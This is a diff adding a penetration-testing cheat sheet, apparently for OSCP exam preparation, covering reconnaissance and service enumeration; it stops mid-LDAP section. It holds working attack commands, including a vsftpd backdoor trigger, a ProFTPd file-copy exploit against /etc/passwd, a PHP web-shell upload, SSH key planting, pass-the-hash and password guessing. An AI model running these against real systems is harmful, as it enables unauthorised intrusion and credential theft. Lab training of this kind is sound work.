@@ -1,0 +1,1333 @@
+<h2 id="ref-0-v5-navigation-note">0. LEGACY NAVIGATION NOTE</h2>
+<p>The former duplicated Rapid-Response block was removed in an earlier build. The anchor is retained for old bookmarks.</p>
+<p>Use:</p>
+<pre class="ref-code"><code class="language-text">Layer 1 / Exam Cockpit
+    ↓
+search tag
+    ↓
+Layer 2 / full reference
+</code></pre>
+<p>Key global tags:</p>
+<pre class="ref-code"><code class="language-text">[TRUST]
+[FALSE-POSITIVE]
+[V5:TRUST]                 # legacy alias retained
+[V5:FALSE-POSITIVE]        # legacy alias retained
+[CREDS:FANOUT]
+[LINUX:TREE]
+[WIN:TREE]
+[AD:FLOW]
+[PIVOT:FLOW]
+[EXPLOIT:GATE]
+[EVIDENCE:PACKET]
+[STUCK:RESET]
+</code></pre>
+<hr/>
+<h2 id="ref-1-pre-engagement-setup">1. PRE-ENGAGEMENT SETUP</h2>
+<details id="ref-1-1-environment-variables">
+<summary>⚙️ 1.1 Environment &amp; Variables</summary>
+<pre class="ref-code"><code class="language-bash"># Set once, use everywhere
+export IP=10.10.10.x
+export LHOST=10.10.14.x       # Your tun0 IP
+export LPORT=4444
+export DOMAIN=domain.local
+export DC=dc01.domain.local
+
+# Get your tun0 IP automatically
+export LHOST=$(ip -4 addr show tun0 | grep -oP '(?&lt;=inet\s)\d+(\.\d+){3}')
+
+# Confirm
+echo "[*] Target: $IP | LHOST: $LHOST:$LPORT"
+</code></pre>
+</details>
+<details id="ref-1-2-directory-structure">
+<summary>📁 1.2 Directory Structure</summary>
+<pre class="ref-code"><code class="language-bash">mkdir -p ~/oscp/$IP/{scans/{nmap,web,smb},exploit,loot/{hashes,creds,keys,files},shells,screenshots,notes}
+cd ~/oscp/$IP
+
+# Fast template function — add to ~/.bashrc
+function newbox() {
+  export IP=$1
+  mkdir -p ~/oscp/$IP/{scans/{nmap,web,smb},exploit,loot/{hashes,creds,keys,files},shells,screenshots,notes}
+  cd ~/oscp/$IP
+  echo "[+] Workspace ready for $IP"
+}
+# Usage: newbox 10.10.10.x
+</code></pre>
+</details>
+<details id="ref-1-3-tmux-setup-never-work-without-it">
+<summary>🖥️ 1.3 tmux Setup (NEVER work without it)</summary>
+<pre class="ref-code"><code class="language-bash"># Record everything
+script -q -c "zsh" ~/oscp/$IP/terminal_$(date +%Y%m%d_%H%M).log
+
+# Start session
+tmux new -s oscp
+
+# Essential keybinds:
+# Ctrl+B %       → Split vertical
+# Ctrl+B "       → Split horizontal
+# Ctrl+B o       → Switch pane
+# Ctrl+B z       → Zoom pane (fullscreen toggle)
+# Ctrl+B [       → Scroll mode (q to exit)
+# Ctrl+B d       → Detach (session stays alive)
+# tmux attach    → Reattach
+
+# Recommended 4-pane layout:
+# ┌─────────────┬─────────────┐
+# │  nmap/enum  │ shell/nc    │
+# ├─────────────┼─────────────┤
+# │  exploit    │ notes/misc  │
+# └─────────────┴─────────────┘
+</code></pre>
+</details>
+<details id="ref-1-4-wordlists-every-important-path">
+<summary>📚 1.4 Wordlists --- Every Important Path</summary>
+<pre class="ref-code"><code class="language-bash"># Passwords
+/usr/share/wordlists/rockyou.txt
+/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+
+# Web content discovery
+/usr/share/seclists/Discovery/Web-Content/common.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  # Parameter fuzzing
+
+# DNS
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+# Usernames
+/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+/usr/share/seclists/Usernames/Names/names.txt
+
+# SNMP
+/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
+
+# Default-credential shortlist source — policy/rate-limit review first; prefer one justified pair on one host.
+/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
+</code></pre>
+</details>
+<details id="ref-1-5-tool-verification-confirm-these-are-installed">
+<summary>🛠️ 1.5 Tool Verification --- Confirm These Are Installed</summary>
+<pre class="ref-code"><code class="language-bash"># Core commands — verify BEFORE exam day:
+command -v nmap autorecon gobuster feroxbuster ffuf nikto whatweb wpscan
+command -v hydra hashcat john nxc netexec impacket-psexec evil-winrm
+command -v bloodhound-ce-python rusthound-ce bloodhound-start sharphound responder
+command -v chisel socat msfconsole searchsploit smbclient ldapsearch snmpwalk
+command -v certipy burpsuite
+command -v git git-dumper
+command -v impacket-dacledit impacket-owneredit impacket-GetLAPSPassword impacket-GetADComputers
+command -v impacket-badsuccessor bloodyAD  # optional/conditional — absence is not exam-blocking
+
+# Versions / local help:
+nxc --version 2&gt;/dev/null
+certipy -v 2&gt;/dev/null
+impacket-psexec -h 2&gt;/dev/null | head
+bloodhound-ce-python -h 2&gt;/dev/null | head
+rusthound-ce -h 2&gt;/dev/null | head
+
+# EXAM RULE REMINDERS:
+# - Burp Community/Free is an allowed example; Burp Pro/commercial offensive services are prohibited.
+# - SQLmap: PROHIBITED on OSCP+; no SQLmap workflow is included here.
+# - Responder poisoning/spoofing: PROHIBITED action.
+# - Metasploit restricted functionality: ONE selected target.
+
+# Prefer Kali packages over surprise pip upgrades immediately before the exam:
+# sudo apt install netexec python3-impacket bloodhound bloodhound-ce-python certipy-ad
+</code></pre>
+</details>
+<details id="ref-1-6-pre-exam-checklist">
+<summary>🔥 1.6 Pre-Exam Checklist</summary>
+<pre class="ref-code"><code>[ ] VPN connected — verify with: ping $IP
+[ ] tun0 interface up — ip a show tun0
+[ ] Burp Suite running, proxy configured
+[ ] /etc/hosts ready to add entries
+[ ] Note-taking app open (Obsidian/CherryTree)
+[ ] Terminal logged (script command)
+[ ] Exam control panel open
+[ ] Screenshots folder ready
+[ ] Known good shells: nc listener test, msfvenom test payload
+[ ] Clock started — note exam end time
+[ ] ProtonVPN/any other VPN DISCONNECTED (use only exam VPN)
+[ ] Phone/tablet/other electronic devices removed or put away; no extra unshared monitor/TV
+[ ] Water, snacks ready
+</code></pre>
+</details>
+<hr/>
+<h2 id="ref-2-reconnaissance-host-discovery">2. RECONNAISSANCE &amp; HOST DISCOVERY</h2>
+<details id="ref-2-1-network-sweep-find-live-hosts">
+<summary>🌐 2.1 Network Sweep --- Find Live Hosts</summary>
+<pre class="ref-code"><code class="language-bash"># Ping sweep
+nmap -sn 10.10.10.0/24 --open -oN scans/nmap/hosts.txt
+
+# ARP scan (more reliable on local network)
+netdiscover -r 10.10.10.0/24 -i tun0
+arp-scan -l
+
+# fping
+fping -a -g 10.10.10.0/24 2&gt;/dev/null
+
+# Range discovery only when the Exam Control Panel scope/routing explicitly justifies it.
+# Start conservatively; validate interesting results with Nmap.
+masscan -p0-65535 $SCOPE_CIDR --rate=1000
+</code></pre>
+</details>
+<details id="ref-2-2-etc-hosts-management">
+<summary>📝 2.2 /etc/hosts Management</summary>
+<pre class="ref-code"><code class="language-bash"># Add target to hosts
+echo "$IP domain.local dc01.domain.local" &gt;&gt; /etc/hosts
+
+# Tip: Always check if web app needs hostname vs IP
+# Some apps only respond to hostname (virtual hosting)
+curl -H "Host: domain.local" http://$IP/
+
+# Vhost discovery
+gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$IP -H "Host: FUZZ.domain.local" -fs 0
+</code></pre>
+</details>
+<hr/>
+<h2 id="ref-3-nmap-port-scanning">3. NMAP &amp; PORT SCANNING</h2>
+<details id="ref-3-1-nmap-workflow-fast-default-adaptive-rate">
+<summary>🔍 3.1 Nmap Workflow --- Fast Default, Adaptive Rate</summary>
+<pre class="ref-code"><code class="language-bash"># STEP 0: Create output directory once
+mkdir -p scans/nmap
+
+# STEP 1: Full TCP scan — conservative VPN baseline; adapt to packet loss
+sudo nmap -Pn -n -p- --min-rate 1000 -oA scans/nmap/tcp-all $IP &amp;
+# If results look sparse or packets drop, reduce/remove --min-rate and retry a small known set.
+
+# STEP 2: Meanwhile, top 1000 with scripts (quicker results while full scan runs)
+sudo nmap -Pn -n -sC -sV --top-ports 1000 -oA scans/nmap/tcp-initial $IP &amp;
+
+# STEP 3: When all-ports finishes, targeted deep scan
+ports=$(awk -F/ '/^[0-9]+\/tcp[[:space:]]+open/{print $1}' scans/nmap/tcp-all.nmap | paste -sd, -)
+echo "Open ports: $ports"
+test -n "$ports" &amp;&amp; sudo nmap -Pn -n -sC -sV -p "$ports" -oA scans/nmap/tcp-detail $IP
+
+# STEP 4: Targeted UDP when the host role, TCP results or remaining hypothesis justifies it
+sudo nmap -Pn -n -sU --top-ports 100 -oA scans/nmap/udp-top100 $IP &amp;
+# Critical UDP: 53,67,68,69,111,123,137,138,139,161,162,500,514,1194,1900
+
+# STEP 5: Run only a selected, relevant NSE script after reviewing its behavior
+SCRIPT='&lt;relevant-script&gt;'
+nmap --script-help "$SCRIPT"
+test -n "$ports" &amp;&amp; sudo nmap -Pn -n --script "$SCRIPT" -p "$ports" -oA scans/nmap/nse-selected $IP
+
+# STEP 6: OS detection only when it will change the next decision
+test -n "$ports" &amp;&amp; sudo nmap -Pn -n -O --osscan-guess -p "$ports" -oA scans/nmap/os $IP
+</code></pre>
+</details>
+<details id="ref-3-2-nmap-tips-tricks">
+<summary>⚡ 3.2 Nmap Tips &amp; Tricks</summary>
+<pre class="ref-code"><code class="language-bash"># Controlled acceleration — reduce/remove the floor if results look incomplete
+--min-rate 1000 --max-retries 2
+
+# If firewall dropping packets — use these
+nmap -sS -p$ports $IP              # SYN scan
+nmap -sA -p$ports $IP              # ACK scan (firewall rules)
+nmap -sN -p$ports $IP              # NULL scan
+nmap -sF -p$ports $IP              # FIN scan
+
+# If host appears "down" but you know it's up
+nmap -Pn $IP                       # Skip host discovery
+nmap -Pn --disable-arp-ping $IP
+
+# Scan through proxychains (for pivoting)
+proxychains nmap -sT -Pn -p 80,443,445,22,3389 192.168.x.x
+
+# Output all formats at once
+nmap -sC -sV -p$ports $IP -oA scans/nmap/targeted
+
+# Extract just open port numbers from result
+grep "open" scans/nmap/targeted.txt | awk '{print $1}' | cut -d'/' -f1
+
+# Parse nmap XML with python (automation)
+python3 -c "
+import xml.etree.ElementTree as ET
+tree = ET.parse('scans/nmap/targeted.xml')
+for port in tree.findall('.//port[@protocol=\"tcp\"]'):
+    state = port.find('state').get('state')
+    if state == 'open':
+        print(port.get('portid'), port.find('service').get('name',''), port.find('service').get('product',''))
+"
+</code></pre>
+</details>
+<details id="ref-3-3-autorecon-background-assistant-manual-enumeration-still-primary">
+<summary>🚀 3.3 AutoRecon — Background Assistant, Manual Enumeration Still Primary</summary>
+<pre class="ref-code"><code class="language-bash"># Basic
+sudo autorecon $IP
+
+# Multiple targets
+sudo autorecon 10.10.10.1 10.10.10.2 10.10.10.3
+
+# With options
+sudo autorecon $IP --single-target --output ~/oscp/$IP/scans
+
+# Autorecon output structure:
+# results/$IP/
+# ├── scans/
+# │   ├── _quick_tcp_nmap.txt
+# │   ├── _full_tcp_nmap.txt
+# │   ├── _top_20_udp_nmap.txt
+# │   ├── tcp80/            ← web enum if port 80 found
+# │   ├── tcp445/           ← smb enum if port 445 found
+# │   └── ...
+# └── report/
+
+# TIP: While AutoRecon runs, manually enumerate the highest-signal services.
+# Do NOT let automated output become a substitute for reading Nmap/service output.
+# Recent 2026 exam feedback repeatedly mentions missed clues sitting directly in tool output.
+# Work in parallel, but maintain one concise findings table per target.
+</code></pre>
+</details>
+<hr/>
+<h2 id="ref-4-service-enumeration-every-port">4. SERVICE ENUMERATION --- EVERY PORT</h2>
+<details id="ref-4-1-ftp-port-21">
+<summary>📁 4.1 FTP --- Port 21</summary>
+<p><code>[PORT:21] [SERVICE:FTP]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── FINGERPRINT ──────────────────────────────────────────────
+banner=$(nc -nv $IP 21 2&gt;&amp;1 | head -1)
+echo $banner                     # Note version!
+searchsploit $(echo $banner | awk '{print $1,$2}')
+
+# ── ANONYMOUS LOGIN ───────────────────────────────────────────
+ftp $IP
+# user: anonymous  pass: (blank) or anonymous@domain.com or press Enter
+ftp&gt; ls -la              # Show hidden files
+ftp&gt; pwd                 # Where are we?
+ftp&gt; binary              # Set binary mode before an allowed targeted retrieval
+ftp&gt; get NECESSARY_FILE  # ONLY if this exact file is necessary to compromise the target
+ftp&gt; put shell.php       # Upload if writable and justified by your attack path
+ftp&gt; passive             # Toggle passive mode if connection issues
+
+# ── LIST FIRST; DO NOT BULK-MIRROR THE SHARE ─────────────────
+# Current OSCP+ guidance forbids downloading exam files/source locally unless
+# necessary to compromise the machine. Enumerate names first, then retrieve only
+# the exact justified artifact and delete the local copy after the objective.
+curl --user 'anonymous:' --list-only "ftp://$IP/"
+# Example only when necessary:
+# curl --user 'anonymous:' "ftp://$IP/path/NECESSARY_FILE" -o loot/NECESSARY_FILE
+
+# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
+# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
+SHORTLIST=notes/password-shortlist.txt
+test -s "$SHORTLIST" &amp;&amp; hydra -L users.txt -P "$SHORTLIST" $IP ftp -t 2 -V
+test -s "$SHORTLIST" &amp;&amp; medusa -h $IP -U users.txt -P "$SHORTLIST" -M ftp -t 2
+
+# ── NMAP SCRIPTS ──────────────────────────────────────────────
+nmap -Pn -n --script ftp-anon,ftp-syst -p21 $IP
+
+# ── KNOWN VULNERABILITIES ─────────────────────────────────────
+# vsftpd 2.3.4 → BACKDOOR → connects on port 6200 after :) in username
+nmap --script ftp-vsftpd-backdoor $IP
+# Manual trigger:
+echo -e "USER user:)\nPASS pass" | nc $IP 21
+nc $IP 6200         # Should give shell
+
+# ProFTPd mod_copy → unauthenticated file copy (CVE-2015-3306)
+nc $IP 21
+SITE CPFR /etc/passwd
+SITE CPTO /var/www/html/passwd.txt
+# Then curl http://$IP/passwd.txt
+
+# ── TIPS ──────────────────────────────────────────────────────
+# Always check:
+#   - config files (.conf, .ini, .cfg)
+#   - .bash_history
+#   - backup files (.bak, .old, .zip)
+#   - Database dumps (.sql)
+#   - SSH keys (id_rsa, authorized_keys)
+</code></pre>
+</details>
+<details id="ref-4-2-ssh-port-22">
+<summary>🔐 4.2 SSH --- Port 22</summary>
+<p><code>[PORT:22] [SERVICE:SSH]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── FINGERPRINT ───────────────────────────────────────────────
+ssh -V
+nc -nv $IP 22 2&gt;&amp;1 | head -1     # Banner = version
+nmap -sV -p22 $IP                 # Also shows version
+
+# ── ALGORITHM ENUMERATION ─────────────────────────────────────
+nmap --script ssh2-enum-algos -p22 $IP
+ssh -o "KexAlgorithms=+diffie-hellman-group1-sha1" user@$IP  # Old algos
+# If "no matching key exchange" error:
+ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 user@$IP
+
+# ── USER ENUMERATION (CVE-2018-15473) ─────────────────────────
+python3 /usr/share/exploitdb/exploits/linux/remote/45233.py $IP 22 root
+# Or:
+# MSF ONE-TARGET LOCK — only after choosing this target: use auxiliary/scanner/ssh/ssh_enumusers
+
+# ── PRIVATE KEY USAGE ─────────────────────────────────────────
+chmod 600 id_rsa
+ssh -i id_rsa user@$IP
+ssh -i id_rsa user@$IP -p 2222   # Custom port
+# If passphrase protected:
+ssh2john id_rsa &gt; id_rsa.hash
+john id_rsa.hash --wordlist=rockyou.txt
+hashcat -m 22921 id_rsa.hash rockyou.txt
+
+# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
+# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
+SHORTLIST=notes/password-shortlist.txt
+test -s "$SHORTLIST" &amp;&amp; hydra -l root -P "$SHORTLIST" $IP ssh -t 2 -f
+test -s "$SHORTLIST" &amp;&amp; hydra -L users.txt -P "$SHORTLIST" $IP ssh -t 2 -f
+
+# ── COMMON DEFAULT CREDS ──────────────────────────────────────
+# root:root | admin:admin | pi:raspberry | vagrant:vagrant
+# ubuntu:ubuntu | user:user | guest:guest
+
+# ── USEFUL FLAGS ──────────────────────────────────────────────
+ssh -o StrictHostKeyChecking=no user@$IP            # Skip host check
+ssh -o UserKnownHostsFile=/dev/null user@$IP        # Don't save to known_hosts
+ssh user@$IP -L 8080:localhost:80                   # Local port forward
+ssh user@$IP -D 1080                                # SOCKS proxy
+ssh user@$IP -N -f -L 8080:127.0.0.1:80            # Background tunnel
+
+# ── WRITE AUTHORIZED_KEYS (if .ssh dir writable) ──────────────
+ssh-keygen -t rsa -b 4096 -f /tmp/oscp_key -N ""
+cat /tmp/oscp_key.pub     # Copy this
+# On target:
+echo "PUBKEY" &gt;&gt; /home/user/.ssh/authorized_keys
+chmod 600 /home/user/.ssh/authorized_keys
+# Connect:
+ssh -i /tmp/oscp_key user@$IP
+
+# ── CVEs ──────────────────────────────────────────────────────
+# OpenSSH &lt; 7.7 → User enumeration (CVE-2018-15473)
+# OpenSSH 7.2p1 → Xauth injection
+searchsploit openssh 7.2
+</code></pre>
+</details>
+<details id="ref-4-3-smtp-port-25-465-587">
+<summary>📧 4.3 SMTP --- Port 25 / 465 / 587</summary>
+<p><code>[PORT:25] [PORT:465] [PORT:587] [SERVICE:SMTP]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── FINGERPRINT ───────────────────────────────────────────────
+nc -nv $IP 25
+nmap -sV --script smtp-commands,smtp-open-relay,smtp-vuln-cve2010-4344 -p 25 $IP
+
+# ── USER ENUMERATION ──────────────────────────────────────────
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
+smtp-user-enum -M EXPN -U users.txt -t $IP
+smtp-user-enum -M RCPT -U users.txt -t $IP -D domain.com
+
+# Manual:
+nc -nv $IP 25
+EHLO test
+VRFY root
+VRFY admin
+VRFY www-data
+EXPN root       # Expand alias
+RCPT TO:root    # Check if user exists
+
+# ── RELAY / RECIPIENT CAPABILITY CHECK — NO MESSAGE DELIVERY ──
+# Stop at RCPT: learn whether the server accepts the envelope without sending content.
+swaks --server "$IP" --from "probe@$DOMAIN" --to "probe@$DOMAIN" --quit-after RCPT
+
+# ── RELAY TEST ────────────────────────────────────────────────
+nmap --script smtp-open-relay $IP -p25
+# If relay is open, record the capability. Use it only when it directly supports an in-scope objective and the current exam rules permit the exact action.
+</code></pre>
+</details>
+<details id="ref-4-4-dns-port-53">
+<summary>🌐 4.4 DNS --- Port 53</summary>
+<p><code>[PORT:53] [SERVICE:DNS]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── BASIC QUERIES ─────────────────────────────────────────────
+dig @$IP domain.com
+dig @$IP domain.com ANY
+nslookup domain.com $IP
+
+# ── ZONE TRANSFER (massive info dump — try ALWAYS) ────────────
+dig axfr @$IP domain.com
+dig axfr @$IP $(dig @$IP +short SOA domain.com | awk '{print $1}')
+# dnsrecon:
+dnsrecon -d domain.com -t axfr -n $IP
+# If zone transfer works — add ALL discovered hosts to /etc/hosts
+
+# ── REVERSE DNS ───────────────────────────────────────────────
+dig -x $IP @$IP
+nmap -R -sL $SCOPE_CIDR    # Reverse lookup the exact in-scope CIDR only
+
+# ── SUBDOMAIN BRUTE FORCE ─────────────────────────────────────
+dnsrecon -d domain.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt -n $IP
+gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $IP:53
+fierce --domain domain.com --dns-servers $IP
+amass enum -d domain.com -r $IP
+
+# ── DNSSEC ────────────────────────────────────────────────────
+dig @$IP domain.com DNSKEY
+dig @$IP domain.com DS
+
+# ── TIPS ──────────────────────────────────────────────────────
+# DNS on TCP = zone transfer
+# DNS on UDP = normal queries
+# If port 53 TCP open → zone transfer likely possible
+# Always try: dig axfr — worst case is REFUSED
+# Discovered hosts → add to /etc/hosts → re-run web enum
+</code></pre>
+</details>
+<details id="ref-4-5-http-https-ports-80-443-8080-8443-8000-8888">
+<summary>🌍 4.5 HTTP / HTTPS --- Ports 80, 443, 8080, 8443, 8000, 8888</summary>
+<p><code>[WEB:ENUM] [PORT:80] [PORT:443] [VHOST]</code></p>
+<pre class="ref-code"><code class="language-bash">
+# __ Nginx _________________
+https://github.com/DepthFirstDisclosures/Nginx-Rift
+
+# ── INITIAL FINGERPRINT ───────────────────────────────────────
+whatweb http://$IP -a 3    # -a 3 = aggressive
+curl -I http://$IP          # Headers (Server, X-Powered-By, etc.)
+curl -sL http://$IP | head -100   # Quick source check
+
+# ── CONTENT DISCOVERY COMBO (run all simultaneously) ──────────
+# Gobuster — fast, reliable
+# try DirBuster-2007_directory-list-2.3-medium.txt if you get nothing from raft
+gobuster dir -u http://$IP \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -x php,html,txt,asp,aspx,jsp,py,rb,bak,old,zip,gz,sql,json,xml,config \
+  -t 50 -o scans/web/gobuster.txt
+
+# Feroxbuster — recursive (finds /admin/login, /api/v1/users etc.)
+feroxbuster -u http://$IP \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -x php,html,txt,asp,aspx -t 50 --depth 3 -o scans/web/ferox.txt
+
+# FFUF — best for parameter fuzzing
+ffuf -u http://$IP/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -o scans/web/ffuf.txt -of md
+
+# Nikto — vuln scanner
+nikto -h http://$IP -output scans/web/nikto.txt -Format txt
+
+# ── MANUAL CHECKS (do these by hand!) ────────────────────────
+# Essential paths to always check:
+curl -s http://$IP/robots.txt
+curl -s http://$IP/sitemap.xml
+curl -s http://$IP/.git/HEAD            # Exposed git repo!
+curl -s http://$IP/.git/config
+# Rule note: do not reconstruct/download exposed source locally unless it is necessary
+# to compromise this target; delete the local copy after the objective.
+curl -s http://$IP/.env                 # Environment vars
+curl -s http://$IP/config.php
+curl -s http://$IP/phpinfo.php
+curl -s http://$IP/wp-config.php
+curl -s http://$IP/web.config
+curl -s http://$IP/.htaccess
+curl -s http://$IP/backup.zip
+curl -s http://$IP/admin/curl -s http://$IP/api/
+curl -s http://$IP/swagger.json         # API docs
+curl -s http://$IP/api/swagger.json
+curl -s http://$IP/server-status        # Apache status
+
+# ── VHOST / SUBDOMAIN DISCOVERY ──────────────────────────────
+# If domain name is known:
+gobuster vhost -u http://domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+ffuf -u http://$IP -H "Host: FUZZ.domain.com" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP)    # Filter by default response size
+
+# ── HTTPS SPECIFIC ────────────────────────────────────────────
+# Check certificate for hostnames/emails
+openssl s_client -connect $IP:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text | grep -E "DNS:|Subject:"
+# SSL vulnerabilities
+nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle -p 443 $IP
+sslscan $IP:443
+testssl.sh $IP
+
+# ── PARAMETER FUZZING ─────────────────────────────────────────
+# Find hidden parameters on a page
+ffuf -u "http://$IP/page.php?FUZZ=test" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP/page.php)
+
+# ── HTTP METHODS ──────────────────────────────────────────────
+curl -X OPTIONS http://$IP/ -v
+# If PUT allowed:
+curl -X PUT http://$IP/shell.php -d "&lt;?php system(\$_GET['cmd']); ?&gt;"
+# If TRACE allowed → Cross-Site Tracing possible
+
+# ── DEFAULT CREDENTIALS TABLE ─────────────────────────────────
+# Always check these on every web app:
+# Tomcat:        admin:admin | tomcat:tomcat | admin:s3cr3t | tomcat:s3cr3t
+# Jenkins:       admin:admin | admin:(blank)
+# phpMyAdmin:    root:(blank) | root:root | root:toor
+# Nagios:        nagiosadmin:nagios
+# Grafana:       admin:admin
+# Kibana:        elastic:changeme
+# Splunk:        admin:changeme
+# WebLogic:      weblogic:weblogic | weblogic:welcome1
+# JBoss:         admin:admin
+# Glassfish:     admin:adminadmin
+# Roundcube:     admin:admin
+# Zabbix:        Admin:zabbix
+# Cacti:         admin:admin
+# OpenVPN AS:    admin:admin
+# Plex:          admin:admin
+# Netdata:       (no auth by default)
+# Home Assistant:(no pass by default)
+
+# ── TECHNOLOGY-SPECIFIC PATHS ─────────────────────────────────
+# WordPress:  /wp-login.php /wp-admin /wp-json/wp/v2/users /xmlrpc.php
+# Drupal:     /user/login /node/add /admin/config
+# Joomla:     /administrator /configuration.php.bak
+# Laravel:    /.env /storage/logs/laravel.log
+# Rails:      /rails/info/properties /rails/info/routes
+# Django:     /admin /static/admin
+# Node/Express: /api/ /__express/ 
+# Spring:     /actuator /actuator/env /actuator/heapdump /h2-console
+# Struts:     *.action *.do
+</code></pre>
+</details>
+<details id="ref-4-6-smb-ports-139-445">
+<summary>🖥️ 4.6 SMB --- Ports 139, 445</summary>
+<p><code>[PORT:445] [PORT:139] [SERVICE:SMB]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── FINGERPRINT ───────────────────────────────────────────────
+nmap -sV -p139,445 $IP
+nmap --script smb-os-discovery,smb-security-mode,smb2-security-mode -p445 $IP
+nxc smb $IP   # Shows OS, hostname, domain, SMB signing status
+
+# ── NULL SESSION / ANONYMOUS ──────────────────────────────────
+smbclient -L //$IP -N                     # List shares (no auth)
+smbmap -H $IP                             # Map shares
+smbmap -H $IP -u '' -p ''                 # Explicit null
+smbmap -H $IP -u 'guest' -p ''
+nxc smb $IP --shares -u '' -p ''
+nxc smb $IP --shares -u 'guest' -p ''
+
+# ── CONNECT TO SHARES ─────────────────────────────────────────
+smbclient //$IP/SHARE -N
+smbclient "//$IP/SHARE" -U "user"           # password prompt
+smbclient "//$IP/SHARE" -U "domain\\user"   # password prompt
+# Inside smbclient — enumerate remotely before retrieving anything:
+smb: \&gt; ls              # List current directory
+smb: \&gt; recurse ON      # Make subsequent ls recursive (listing only)
+smb: \&gt; ls              # Inspect names/paths without bulk retrieval
+smb: \&gt; get NECESSARY_FILE   # ONLY if this exact file is necessary to compromise the target
+smb: \&gt; put shell.asp   # Upload only when justified by your attack path
+
+# Non-interactive recursive LISTING (no bulk mget):
+smbclient //$IP/SHARE -N -c 'recurse;ls'
+# If one exact remote artifact is necessary, retrieve only that path and delete
+# the local copy after the objective. Do not mirror/mget an entire share.
+
+# ── FULL ENUMERATION ──────────────────────────────────────────
+enum4linux -a $IP 2&gt;/dev/null | tee scans/smb/enum4linux.txt
+enum4linux-ng $IP -A -oA scans/smb/enum4linux-ng 2&gt;/dev/null
+
+# nxc full sweep
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --shares
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --sessions
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --users
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --groups
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --computers
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --loggedon-users
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --disks
+nxc smb $IP -u '' -p '' --rid-brute
+
+
+# ── VULNERABILITY CHECKS ──────────────────────────────────────
+nmap -Pn -n -p445 --script smb-protocols,smb2-security-mode,smb2-time,smb-os-discovery $IP
+# Then run ONE exact smb-vuln-* check only when SMB/OS evidence justifies that specific hypothesis.
+
+# EternalBlue (MS17-010) manual check:
+python3 checker.py $IP    # From exploit repo
+
+# ── PASS THE HASH VIA SMB ─────────────────────────────────────
+nxc smb $IP -u user -H NTLMHASH
+nxc smb $IP -u Administrator -H HASH --sam
+smbclient //$IP/SHARE -U user --pw-nt-hash NTLMHASH
+
+# ── TIPS ──────────────────────────────────────────────────────
+# Always look for:
+#   - passwords in .txt .doc .xlsx .conf files
+#   - scripts that run as another user (check scheduled tasks)
+#   - writable shares → upload shell → find execution vector
+#   - .ini files (autorun.ini can execute on connect)
+#   - Sysvol/NETLOGON → Group Policy → GPP passwords (cpassword)
+# GPP password decrypt:
+gpp-decrypt "ENCRYPTEDPASSWORD"
+# Or find in: \\DC\SYSVOL\domain\Policies\**\Groups.xml
+</code></pre>
+</details>
+<details id="ref-4-7-ldap-ports-389-636-3268-3269">
+<summary>📒 4.7 LDAP --- Ports 389, 636, 3268, 3269</summary>
+<p><code>[AD:LDAP] [PORT:389] [PORT:636]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── ANONYMOUS BIND ────────────────────────────────────────────
+ldapsearch -x -H ldap://$IP -b "" -s base
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com"
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=*)" &gt; scans/ldap/anon_dump.txt
+
+# ── AUTHENTICATED ─────────────────────────────────────────────
+ldapsearch -x -H ldap://$IP -D "cn=user,dc=domain,dc=com" -W -b "dc=domain,dc=com"
+ldapsearch -x -H ldap://$IP -D "domain\\user" -W -b "dc=domain,dc=com" "(objectClass=user)"
+
+# ── USEFUL LDAP QUERIES ───────────────────────────────────────
+# All users:
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
+# All computers:
